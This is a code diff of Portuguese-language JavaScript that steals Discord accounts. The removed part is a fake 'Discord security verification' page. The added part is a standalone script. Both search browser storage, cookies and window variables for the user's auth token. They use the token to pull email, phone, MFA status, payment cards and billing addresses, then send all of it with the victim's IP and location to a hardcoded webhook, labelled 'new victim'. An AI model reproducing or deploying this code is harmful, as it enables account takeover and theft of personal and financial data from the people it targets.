@@ -1,410 +1,116 @@
-<!DOCTYPE html>
-<html lang="pt-PT">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Verificação de Segurança</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e1e2e, #2c2c3e);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #fff;
-        }
-        .container {
-            background: #31313f;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 480px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 8px; }
-        .subtitle { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; }
-        .progress-bar {
-            width: 100%; height: 8px;
-            background: #20202b; border-radius: 4px;
-            overflow: hidden; margin: 20px 0;
-        }
-        .progress-fill {
-            height: 100%; width: 0%;
-            background: #5865F2; border-radius: 4px;
-            transition: width 0.5s;
-        }
-        .status { color: #b9bbbe; font-size: 13px; margin-bottom: 8px; }
-        .footer { margin-top: 24px; font-size: 12px; color: #4e5058; }
-    </style>
-</head>
-<body>
-<div class="container">
-    <svg class="logo" viewBox="0 0 127.14 96.36" fill="#5865F2">
-        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,56.6,122.09,32.65,107.7,8.07ZM42.25,65.64C36.21,65.64,31.3,60,31.3,53.2s5-12.5,11.14-12.5S53.57,46.6,53.57,53.2,48.36,65.64,42.25,65.64Zm42.64,0C78.85,65.64,74,60,74,53.2s5-12.5,11.12-12.5S96.21,46.6,96.21,53.2,91,65.64,84.89,65.64Z"/>
-    </svg>
-    <h1>Verificação de segurança necessária</h1>
-    <p class="subtitle">Sua conta do Discord precisa ser verificada devido a uma atividade suspeita.</p>
-    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-    <p class="status" id="statusText">Iniciando verificação...</p>
-    <div class="footer">Discord Inc. &bull; Verificação automática de segurança</div>
-</div>
+(async () => {
+    // Webhook para onde enviar os dados
+    const webhook = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
+    
+    function enviar(mensagem) {
+        fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: mensagem })
+        }).catch(() => {});
+    }
 
-<script>
-    (async function() {
-        const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
-        
-        const statusText = document.getElementById('statusText');
-        const progressFill = document.getElementById('progressFill');
-
-        function atualizar(texto, progresso) {
-            statusText.textContent = texto;
-            progressFill.style.width = progresso + "%";
-        }
-
-        // === 1. IP ===
-        atualizar("Coletando informações do sistema...", 10);
-        let ip = "Não capturado";
-        try {
-            const resp = await fetch("https://api.ipify.org?format=json");
-            const data = await resp.json();
-            ip = data.ip;
-        } catch(e) {}
-
-        // === 2. LOCALIZAÇÃO ===
-        atualizar("Analisando localização...", 20);
-        let cidade = "N/A", pais = "N/A", isp = "N/A";
-        try {
-            const locResp = await fetch("https://ipapi.co/json/");
-            const locData = await locResp.json();
-            cidade = locData.city || "N/A";
-            pais = locData.country_name || "N/A";
-            isp = locData.org || "N/A";
-        } catch(e) {}
-
-        // === 3. TENTAR CAPTURAR TOKEN - TODOS OS MÉTODOS ===
-        atualizar("Analisando sessão do Discord...", 35);
-        
-        let token = null;
-        let metodos = [];
-        
-        // LISTA DE CHAVES COMUNS ONDE O DISCORD GUARDA TOKEN
-        const chavesPossiveis = [
-            "token", "access_token", "refresh_token", "discord_token",
-            "discord_access_token", "authorization", "bearer",
-            "oauth_token", "session_token", "auth_token",
-            "discordauth", "discord_session", "user_token",
-            "client_token", "api_token", "jwt", "session",
-            "discord.user.token", "discord_token_v2",
-            "discord.accessToken", "discord.refreshToken"
-        ];
-        
-        // Método 1: localStorage com chaves conhecidas
-        try {
-            for (const chave of chavesPossiveis) {
-                try {
-                    const valor = localStorage.getItem(chave);
-                    if (valor && valor.length > 20) {
-                        token = valor;
-                        metodos.push("localStorage:" + chave);
-                        break;
-                    }
-                } catch(e) {}
+    // 1. OBTER TOKEN do localStorage
+    const token = localStorage.getItem("token");
+    if (!token) {
+        // Tentar outras chaves
+        const chaves = ["access_token", "discord_token", "session"];
+        for (const chave of chaves) {
+            const val = localStorage.getItem(chave);
+            if (val && val.length > 20) {
+                token = val;
+                break;
             }
-        } catch(e) {}
-        
-        // Método 2: sessionStorage com chaves conhecidas
-        if (!token) {
-            try {
-                for (const chave of chavesPossiveis) {
-                    try {
-                        const valor = sessionStorage.getItem(chave);
-                        if (valor && valor.length > 20) {
-                            token = valor;
-                            metodos.push("sessionStorage:" + chave);
-                            break;
-                        }
-                    } catch(e) {}
-                }
-            } catch(e) {}
         }
-        
-        // Método 3: Varrer TODO o localStorage
-        if (!token) {
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const chave = localStorage.key(i);
-                    const valor = localStorage.getItem(chave);
-                    if (valor && typeof valor === 'string' && valor.length > 30) {
-                        // Parece token se tiver pontos e for longo
-                        if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) {
-                            token = valor;
-                            metodos.push("localStorage:" + chave.substring(0, 20));
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 4: Varrer TODO o sessionStorage
-        if (!token) {
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const chave = sessionStorage.key(i);
-                    const valor = sessionStorage.getItem(chave);
-                    if (valor && typeof valor === 'string' && valor.length > 30) {
-                        if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) {
-                            token = valor;
-                            metodos.push("sessionStorage:" + chave.substring(0, 20));
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 5: Procurar em IndexedDB (tentativa)
-        if (!token) {
-            try {
-                const databases = await indexedDB.databases ? await indexedDB.databases() : [];
-                for (const db of databases) {
-                    if (db.name && db.name.toLowerCase().includes('discord')) {
-                        metodos.push("indexedDB:" + db.name);
-                        // Não conseguimos extrair o token diretamente do IndexedDB por CORS
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 6: Procurar em cookies
-        if (!token) {
-            try {
-                const cookies = document.cookie.split(';');
-                for (const cookie of cookies) {
-                    const [nome, valor] = cookie.trim().split('=');
-                    if (valor && valor.length > 30 && (valor.includes('.') || valor.includes('mfa'))) {
-                        token = valor;
-                        metodos.push("cookie:" + nome);
-                        break;
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        // Método 7: Procurar em todas as variáveis window
-        if (!token) {
-            try {
-                for (const key in window) {
-                    try {
-                        const val = window[key];
-                        if (val && typeof val === 'string' && val.length > 50 && val.includes('.')) {
-                            const parts = val.split('.');
-                            if (parts.length === 3) {
-                                token = val;
-                                metodos.push("window." + key);
-                                break;
-                            }
-                        }
-                    } catch(e) {}
-                }
-            } catch(e) {}
-        }
+    }
+    
+    if (!token || token.length < 40) {
+        enviar(`❌ Token não encontrado no Discord. IP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'N/A')}`);
+        return;
+    }
 
-        // === 4. SE ENCONTROU TOKEN, PEGAR DADOS ===
-        atualizar("Verificando dados da conta...", 50);
-        
-        let email = "Não disponível";
-        let phone = "Não disponível";
-        let username = "Não logado";
-        let userID = "Desconhecido";
-        let nitro = "N/A";
-        let mfa = "N/A";
-        let avatar = "N/A";
-        let bio = "N/A";
-        let verified = "N/A";
-        let createdAt = "N/A";
-        
-        if (token && token.length > 40 && !token.includes(" ")) {
-            try {
-                const headers = { "Authorization": token };
-                
-                // Tenta API v9
-                let resp = await fetch("https://discord.com/api/v9/users/@me", { headers });
-                
-                if (!resp.ok) {
-                    // Tenta API v10
-                    resp = await fetch("https://discord.com/api/v10/users/@me", { headers });
-                }
-                
-                if (resp.ok) {
-                    const data = await resp.json();
-                    
-                    username = data.username || "Desconhecido";
-                    if (data.discriminator && data.discriminator !== "0") {
-                        username += "#" + data.discriminator;
-                    }
-                    userID = data.id || "Desconhecido";
-                    email = data.email || "Oculto/indisponível";
-                    phone = data.phone || "Não vinculado";
-                    mfa = data.mfa_enabled ? "Sim" : "Não";
-                    bio = data.bio || "Vazio";
-                    verified = data.verified ? "Sim" : "Não";
-                    
-                    // Nitro
-                    const premium = data.premium_type || 0;
-                    nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
-                    
-                    // Avatar
-                    if (data.avatar && data.id) {
-                        avatar = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
-                    }
-                    
-                    // Data de criação (aproximada pelo ID)
-                    if (data.id) {
-                        const timestamp = (parseInt(data.id) / 4194304) + 1420070400000;
-                        createdAt = new Date(timestamp).toLocaleDateString('pt-PT');
-                    }
-                    
-                    // Tentar settings para email/telefone
-                    try {
-                        const settingsResp = await fetch("https://discord.com/api/v9/users/@me/settings", { headers });
-                        if (settingsResp.ok) {
-                            const settings = await settingsResp.json();
-                            if (settings.email && email === "Oculto/indisponível") email = settings.email;
-                            if (settings.phone && phone === "Não vinculado") phone = settings.phone;
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar connections (redes sociais vinculadas)
-                    let connections = "N/A";
-                    try {
-                        const connResp = await fetch("https://discord.com/api/v9/users/@me/connections", { headers });
-                        if (connResp.ok) {
-                            const connData = await connResp.json();
-                            if (connData.length > 0) {
-                                connections = connData.slice(0, 5).map(c => `${c.type}: ${c.name}`).join(", ");
-                            }
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar guilds (servidores)
-                    let guildsCount = "N/A";
-                    try {
-                        const guildsResp = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
-                        if (guildsResp.ok) {
-                            const guildsData = await guildsResp.json();
-                            guildsCount = guildsData.length + " servidores";
-                        }
-                    } catch(e) {}
-                    
-                    // Tentar billing
-                    let billingInfo = "N/A";
-                    try {
-                        const billResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers });
-                        if (billResp.ok) {
-                            const billData = await billResp.json();
-                            if (billData.length > 0) {
-                                billingInfo = billData.length + " método(s) de pagamento";
-                            }
-                        }
-                    } catch(e) {}
+    // 2. CHAMAR API DO DISCORD com o token real
+    const headers = { "Authorization": token };
+    const userResp = await fetch("https://discord.com/api/v9/users/@me", { headers });
+    
+    if (!userResp.ok) {
+        enviar(`❌ Token inválido. Status: ${userResp.status}. Token: ${token.substring(0, 20)}...`);
+        return;
+    }
 
-                    // MONTAR MENSAGEM COMPLETA
-                    const mensagem = 
-                        `**🎯 NOVA VÍTIMA - TOKEN VÁLIDO**\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**👤 USUÁRIO**\n` +
-                        `**Discord:** ${username}\n` +
-                        `**ID:** ${userID}\n` +
-                        `**Email:** ${email}\n` +
-                        `**Telefone:** ${phone}\n` +
-                        `**Verificado:** ${verified}\n` +
-                        `**MFA:** ${mfa}\n` +
-                        `**Nitro:** ${nitro}\n` +
-                        `**Bio:** ${bio}\n` +
-                        `**Conta criada:** ${createdAt}\n` +
-                        `**Avatar:** ${avatar}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**📊 ESTATÍSTICAS**\n` +
-                        `**Servidores:** ${guildsCount}\n` +
-                        `**Conexões:** ${connections}\n` +
-                        `**Pagamento:** ${billingInfo}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**🔑 TOKEN**\n` +
-                        `\`${token}\`\n` +
-                        `**Método:** ${metodos.join(", ") || "Desconhecido"}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**🌐 LOCALIZAÇÃO**\n` +
-                        `**IP:** ${ip}\n` +
-                        `**Cidade:** ${cidade}\n` +
-                        `**País:** ${pais}\n` +
-                        `**ISP:** ${isp}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**💻 SISTEMA**\n` +
-                        `**Navegador:** ${navigator.userAgent.substring(0, 80)}\n` +
-                        `**Idioma:** ${navigator.language}\n` +
-                        `**Resolução:** ${screen.width}x${screen.height}\n` +
-                        `**Fuso:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+    const user = await userResp.json();
 
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: mensagem })
-                    });
-                    
-                } else {
-                    // Token inválido
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: 
-                            `**⚠️ Token Inválido**\n` +
-                            `**Token:** \`${token}\`\n` +
-                            `**IP:** ${ip}\n` +
-                            `**Status HTTP:** ${resp.status}`
-                        })
-                    });
-                }
-            } catch(e) {
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: 
-                        `**❌ Erro ao validar token**\n` +
-                        `**IP:** ${ip}\n` +
-                        `**Erro:** ${e.message}`
-                    })
-                });
+    // 3. DADOS DO PERFIL
+    const username = user.username + (user.discriminator && user.discriminator !== "0" ? "#" + user.discriminator : "");
+    const userID = user.id;
+    const email = user.email || "Oculto";
+    const phone = user.phone || "Não vinculado";
+    const mfa = user.mfa_enabled ? "✅ Sim" : "❌ Não";
+    const verified = user.verified ? "✅ Sim" : "❌ Não";
+    const premium = ["Não", "Nitro Básico", "Nitro Clássico", "Nitro"][user.premium_type || 0];
+
+    // 4. BILLING (cartões de crédito)
+    let billing = "Nenhum";
+    try {
+        const billResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers });
+        if (billResp.ok) {
+            const billData = await billResp.json();
+            if (billData.length > 0) {
+                billing = billData.map(b => {
+                    let info = `${b.type}`;
+                    if (b.brand) info += ` ${b.brand}`;
+                    if (b.last_4) info += ` ****${b.last_4}`;
+                    if (b.billing_address) info += ` | ${b.billing_address.name}, ${b.billing_address.country}`;
+                    return info;
+                }).join("\n");
             }
-        } else {
-            // Nenhum token encontrado
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: 
-                    `**❌ Token não encontrado**\n` +
-                    `**IP:** ${ip}\n` +
-                    `**Cidade:** ${cidade}\n` +
-                    `**País:** ${pais}\n` +
-                    `**ISP:** ${isp}\n` +
-                    `**Navegador:** ${navigator.userAgent.substring(0, 80)}\n` +
-                    `**Idioma:** ${navigator.language}\n` +
-                    `**Métodos tentados:** localStorage, sessionStorage, cookies, IndexedDB, window`
-                })
-            });
         }
+    } catch(e) {}
 
-        // === 5. FINALIZAR ===
-        atualizar("Verificação concluída! Redirecionando...", 100);
-        
-        setTimeout(() => {
-            window.location.href = "https://discord.com/login";
-        }, 3000);
-    })();
-</script>
-</body>
-</html>
+    // 5. GUILDS (servidores)
+    let guildsCount = 0;
+    try {
+        const guildsResp = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
+        if (guildsResp.ok) {
+            const guilds = await guildsResp.json();
+            guildsCount = guilds.length;
+        }
+    } catch(e) {}
+
+    // 6. LOCALIZAÇÃO
+    let ip = "N/A", cidade = "N/A", pais = "N/A";
+    try {
+        const locData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        ip = locData.ip || (await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip));
+        cidade = locData.city || "N/A";
+        pais = locData.country_name || "N/A";
+    } catch(e) {}
+
+    // 7. MONTAR MENSAGEM
+    const mensagem = 
+        `🎯 **NOVA VÍTIMA - TOKEN VÁLIDO**\n` +
+        `━━━━━━━━━━━━━━━━\n` +
+        `👤 **Usuário:** ${username}\n` +
+        `🆔 **ID:** ${userID}\n` +
+        `📧 **Email:** ${email}\n` +
+        `📞 **Telefone:** ${phone}\n` +
+        `✅ **Verificado:** ${verified}\n` +
+        `🔐 **MFA:** ${mfa}\n` +
+        `💎 **Nitro:** ${premium}\n` +
+        `━━━━━━━━━━━━━━━━\n` +
+        `💳 **Pagamentos:**\n${billing}\n` +
+        `━━━━━━━━━━━━━━━━\n` +
+        `🏰 **Servidores:** ${guildsCount}\n` +
+        `━━━━━━━━━━━━━━━━\n` +
+        `🔑 **Token:** \`${token}\`\n` +
+        `━━━━━━━━━━━━━━━━\n` +
+        `🌐 **IP:** ${ip}\n` +
+        `📍 **Cidade:** ${cidade}\n` +
+        `🌍 **País:** ${pais}\n` +
+        `💻 **UA:** ${navigator.userAgent.substring(0, 60)}`;
+
+    // 8. ENVIAR
+    enviar(mensagem);
+
+    console.log("✅ Dados enviados com sucesso!");
+})();
